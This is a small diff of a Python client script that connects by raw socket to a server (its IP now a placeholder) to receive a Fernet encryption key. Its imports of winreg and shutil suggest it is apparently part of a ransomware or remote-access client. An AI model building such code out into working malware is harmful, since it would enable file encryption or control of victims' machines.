@@ -6,11 +6,11 @@ import shutil
 import winreg
 from cryptography.fernet import Fernet
 
-SERVER_IP = '10.57.218.161'
+SERVER_IP = 'InsertIP'
 PORT = 9999
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(("10.57.218.161", 9999))
+client.connect(("InsertIP", 9999))
 
 # Receive encryption key
 key = client.recv(1024)
